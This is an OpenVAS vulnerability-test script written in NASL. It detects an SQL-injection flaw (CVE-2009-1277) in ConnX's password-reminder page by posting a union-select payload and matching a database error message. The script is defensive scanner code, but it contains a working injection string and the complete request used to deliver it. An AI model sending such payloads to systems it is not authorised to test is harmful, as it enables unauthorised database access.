###############################################################################
# OpenVAS Vulnerability Test
# $Id: ConnX_34388.nasl 15 2013-10-27 12:49:54Z jan $
#
# ConnX 'frmLoginPwdReminderPopup.aspx' SQL Injection Vulnerability
#
# Authors
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "ConnX is prone to an unspecified SQL-injection vulnerability because
  it fails to sufficiently sanitize user-supplied data before using it
  in an SQL query.

  Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.

  ConnX 4.0.20080606 is vulnerable; other versions may also be
  affected.";


if (description)
{
 script_id(100115);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-04-08 20:52:50 +0200 (Wed, 08 Apr 2009)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2009-1277");
 script_bugtraq_id(34370);
 script_tag(name:"risk_factor", value:"High");

 script_name("ConnX 'frmLoginPwdReminderPopup.aspx' SQL Injection Vulnerability");
 desc = "

 Summary:
 " + tag_summary;


 script_description(desc);
 script_summary("Determine if ConnX is vulnerable to SQL Injection");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("ConnX_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_asp(port:port))exit(0);

if(!version = get_kb_item(string("www/", port, "/connx")))exit(0);
if(!matches = eregmatch(string:version, pattern:"^(.+) under (/.*)$"))exit(0);

dir  = matches[2];

  if(!isnull(dir)) {

    variables=string("__EVENTTARGET=&__EVENTARGUMENT=&ctl00%24hfLoad=&ctl00%24txtFilter=&ctl00%24txtHelpFile=&ctl00%24txtReportsButtonOffset=70&ctl00%24cphMainContent%24txtEmail=++'+union+select+%40%40version%3B--&ctl00%24cphMainContent%24cbSubmit=Submit&ctl00%24txtCurrentFavAdd=&ctl00%24hfFavsTrigger=");
    filename = string(dir + "/frmLoginPwdReminderPopup.aspx");
    host=get_host_name();

    req = string(
              "POST ", filename, " HTTP/1.0\r\n",
              "Referer: ","http://", host, filename, "\r\n",
              "Host: ", host, ":", port, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", strlen(variables),
              "\r\n\r\n",
              variables
           ); 

     buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
     if( buf == NULL )exit(0);

     if(egrep(pattern:"Syntax error converting the nvarchar value", string: buf,icase:TRUE))
       {    
          security_hole(port:port);
          exit(0);
       }
  }


exit(0);
